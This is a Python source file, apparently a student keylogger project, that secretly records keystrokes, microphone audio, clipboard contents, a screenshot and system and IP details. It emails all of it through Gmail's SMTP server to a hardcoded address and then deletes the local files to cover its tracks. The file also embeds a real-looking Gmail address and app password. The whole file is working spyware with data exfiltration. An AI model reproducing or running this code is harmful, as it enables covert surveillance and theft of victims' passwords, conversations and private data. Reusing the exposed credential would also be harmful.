# Libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import multiprocessing
import os

from scipy.io.wavfile import write
import sounddevice as sd

from requests import get

from PIL import ImageGrab

from datetime import date


keys_information = "key_log.txt"
system_information = "syseminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

microphone_time = 15

# senders email address
email_address = "twilightdawn0110@gmail.com"
password = "nhwjbyibbfcjqgwx"


# receivers mail address
toaddr = "twilightdawn0110@gmail.com"


# file path definations
file_path = "C:\\Users\\Acer\\Desktop\\nsProj\\keylogger\\Project"
extend = "\\"
file_merge = file_path + extend
all_files = [file_path + extend + keys_information,
             file_path + extend + system_information,
             file_path + extend + clipboard_information,
             file_path + extend + audio_information,
             file_path + extend + screenshot_information]


# get email controls
def send_email(attachments, toaddr):

    fromaddr = email_address
    today = date.today()
    msg = MIMEMultipart()

    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = socket.gethostname() + "'s Log File"
    body = "Send @" + str(today.strftime("%d/%m/%Y %H:%M:%S"))
    msg.attach(MIMEText(body, 'plain'))

    # attach multiple files
    for attachment in attachments:
        p = MIMEBase('application', 'octet-stream')
        a = open(attachment, "rb")
        p.set_payload((a).read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', "attachment; filename= %s" %
                     os.path.basename(attachment))
        msg.attach(p)
        print('all attached')

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()
    print("its sent!!")


# get the computer information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() +
                " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")


# get keyloggs
count = 0
keys = []


def keyloggs():

    def on_press(key):
        global keys, count

        # print(key)
        keys.append(key)

        count = count+1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == "Key.esc":
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


# get screenshots
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)


# get the microphone
def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)


# get the clipboard contents
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")


# Clean up our tracks and delete files
def clear_logFile():
    delete_files = [system_information, clipboard_information,
                    keys_information, screenshot_information, audio_information]
    for file in delete_files:
        os.remove(file_merge + file)


# main
if __name__ == '__main__':
    p = multiprocessing.Process(target=keyloggs, name="keyloggs")
    p.start()
    microphone()
    time.sleep(10)
    p.terminate()
    copy_clipboard()
    computer_information()
    screenshot()
    send_email(all_files, toaddr)
    p.join()
    clear_logFile()


